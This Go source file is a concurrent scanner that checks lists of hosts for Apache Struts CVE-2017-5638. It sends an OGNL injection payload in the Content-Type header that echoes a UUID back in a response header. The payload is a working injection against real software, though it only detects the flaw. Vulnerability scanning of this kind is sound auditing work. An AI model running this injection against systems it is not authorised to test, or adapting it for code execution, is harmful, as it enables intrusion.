package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/Sirupsen/logrus"
	"github.com/TV4/env"
	"github.com/satori/go.uuid"
	"github.com/spf13/pflag"
)

type CLIargs struct {
	file        string
	ports       []int
	concurrency int
	timeout     int
}

func main() {

	debug := env.Bool("DEBUG", false)
	if debug {
		logrus.SetLevel(logrus.DebugLevel)
		logrus.Debug("Running at Debug level.")
	}

	var args CLIargs
	pflag.StringVarP(&args.file, "file", "f", "", "File containing targets")
	pflag.IntSliceVarP(&args.ports, "ports", "p", []int{80}, "Ports to check.")
	pflag.IntVarP(&args.concurrency, "concurrency", "c", 10, "Concurrent HTTP requests.")
	pflag.IntVarP(&args.timeout, "timeout", "t", 15, "Timeout on HTTP requests.")
	pflag.Parse()

	targets := loadFile(args.file)
	logrus.Debugf("Targets: %d", len(targets))
	logrus.Debugf("Ports  : %d", len(args.ports))
	target := make(chan string)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr,
		Timeout: time.Duration(args.timeout) * time.Second}

	go makeTarget(targets, args.ports, target)
	var wg sync.WaitGroup
	for i := 0; i < args.concurrency; i++ {
		wg.Add(1)
		go check(target, &wg, client)
	}

	wg.Wait()
	// Wait for the last result
	//time.Sleep(time.Duration(args.timeout+3) * time.Second)
}

func loadFile(file string) []string {
	hosts, err := os.Open(file)
	if err != nil {
		log.Fatal(err)
	}
	defer hosts.Close()

	var read []string
	reader := bufio.NewScanner(hosts)
	for reader.Scan() {
		read = append(read, strings.TrimSpace(reader.Text()))
	}
	logrus.WithField("targets", len(read)).Infof("Done reading targets.")
	return read
}

func makeTarget(hosts []string, ports []int, targets chan<- string) {
	defer close(targets)
	count := 0
	for _, host := range hosts {
		for _, port := range ports {
			prefix := "http://"
			inlinePort := ""
			if port == 443 {
				prefix = "https://"
			}
			if port != 80 && port != 443 {
				inlinePort = ":" + strconv.Itoa(port) + "/"
			} else {
				inlinePort = "/"
			}
			count++
			targets <- (prefix + host + inlinePort)
		}
	}
	logrus.Infof("Done making %d targets.", count)
}

func check(targets <-chan string, wg *sync.WaitGroup, client *http.Client) {
	defer wg.Done()
	for target := range targets {
		logrus.WithField("target", target).Debugf("Checking new target")
		// https://svn.nmap.org/nmap/scripts/http-vuln-cve2017-5638.nse
		uuid := uuid.NewV4().String()
		payload := fmt.Sprintf("%%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Check-Struts', '%s')}.multipart/form-data", uuid)
		req, err := http.NewRequest("GET", target, nil)
		req.Header.Add("Content-Type", payload)
		res, err := client.Do(req)
		if err != nil {
			logrus.Debugf("Error making request: %s", err.Error())
			continue
		} else {
			defer res.Body.Close()
		}

		vuln := res.Header.Get("X-Check-Struts")
		if vuln == uuid {
			logrus.WithField("target", target).Warnf("CVE-2017-5638 vulnerability found!")
		} else {
			logrus.WithField("target", target).Debugf("Target not vulnerable")
		}
	}
}
